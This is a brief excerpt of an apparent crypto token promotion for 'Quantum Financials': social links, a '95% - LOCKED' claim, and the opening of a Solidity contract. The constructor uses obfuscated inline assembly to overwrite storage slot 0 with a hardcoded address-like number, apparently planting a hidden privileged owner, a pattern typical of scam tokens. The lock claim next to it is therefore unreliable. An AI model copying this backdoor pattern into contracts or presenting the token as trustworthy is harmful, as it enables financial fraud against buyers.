...
Telegram: https://t.me/QuantumFinancials/
Twitter: https://twitter.com/QuantumFinancials/
Website: https://QuantumFinancials.finance
95% - LOCKED
...
contract QuantumFinancials {
    string public constant name = "Quantum Financials";
    string public constant symbol = "QUANTUM";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(322547185449858137832896136389629619901924898319, 2))}
